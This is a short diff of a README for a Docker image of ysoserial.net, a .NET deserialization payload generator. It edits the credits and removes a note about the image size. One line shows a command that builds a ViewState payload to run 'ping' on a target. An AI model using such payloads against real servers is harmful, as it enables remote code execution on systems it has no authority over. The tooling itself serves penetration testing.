@@ -1,5 +1,7 @@
 ## Docker image for ysoserial.net
 
+This is modified version that use docker alpine instead of ubuntu from https://github.com/ar0x4/ysoserial.net-docker 
+
 ### Usage
 
 - Build the image
@@ -22,8 +24,3 @@ ysoserial run '-p ViewState  -g TextFormattingRunProperties -c "ping 10.10.14.95
 #### Example
 
 ![alt text](images/image.png)
-
-#### Note:
-- The image is about 5GB so it will take some time to build and make sure you have enough space on your machine.
- 
-![alt text](images/image-1.png)
